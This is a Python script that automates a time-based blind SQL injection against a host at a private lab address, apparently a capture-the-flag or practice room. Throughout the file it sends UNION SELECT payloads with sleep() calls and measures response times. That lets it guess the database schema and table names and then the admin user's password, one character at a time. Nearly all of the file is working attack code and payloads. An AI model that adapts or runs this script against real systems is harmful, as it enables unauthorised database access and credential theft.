import requests
import time
import string
from concurrent.futures import ThreadPoolExecutor

def send_query(url :str , path : str , data : dict) -> str:
    start = time.time()
    r = requests.post(f"{url}{path}" , data=data)
    end = time.time()
    return (end-start)

def fuzz_db(url :str , path: str , burp_proxy : str ,level : int , sql_statement : str , sql_kwargs : dict = {}) -> str :
    name = ""
    chars = string.ascii_letters + string.digits + "_-@#$"

    while True:
        flag = False
        for c in chars:        
            flag = False
            temp = name + c
            sql_kwargs["temp"] = temp

            sql_payload = sql_statement.format(**sql_kwargs)
            data = {"level":level , "sql" : sql_payload}
            with ThreadPoolExecutor(max_workers=40) as executor:
                k = c
                res = executor.submit(send_query , url , path , data).result()
                print(res , temp , end="\r")
                if res >= sql_kwargs["sleep_time"] :
                    name = name + k
                    print("\nEnumerating Name : " ,name) 
                    flag = True 
                    break
            
            if flag:
                break 

        if not flag:
            break
    
    return name


url = "http://10.10.118.183"
path = "/run"
level = 4
burp_proxy = "http://localhost:8080"
sleep_time = 2
sql_schema_statement = "select * from analytics_referrers where domain='aa' union select 1,sleep({sleep_time}) from information_schema.schemata where database() like '{temp}%' -- -"

data_kwargs = {"sleep_time":sleep_time}
db_schema = fuzz_db(url , path , burp_proxy ,level, sql_schema_statement , data_kwargs)  #sqli_three
print("\nSchema Name  \n" , db_schema)

################# enumerating tables ##########################
sql_table_statement = "select * from analytics_referrers where domain='aa' union select 1,sleep({sleep_time}) from information_schema.tables where table_schema = '{db_schema}' and table_name like '{temp}%' and table_name != 'analytics_referrers' -- -"

data_kwargs = {"sleep_time":sleep_time , "db_schema":db_schema}
table_name = fuzz_db(url , path , burp_proxy ,level, sql_table_statement , data_kwargs)
print("\nTable Name  \n" , table_name)

############ enumerating columns #############################
# username and password are the columns

################ eumerating admin password ####################3

sql_password_statement = "select * from analytics_referrers where domain='aa' union select 1,sleep({sleep_time}) from users where username = 'admin' and password like '{temp}%' -- -"
data_kwargs = {"sleep_time" : sleep_time}
admin_password = fuzz_db(url , path , burp_proxy ,level, sql_password_statement , data_kwargs)
print("\npassword : " ,admin_password)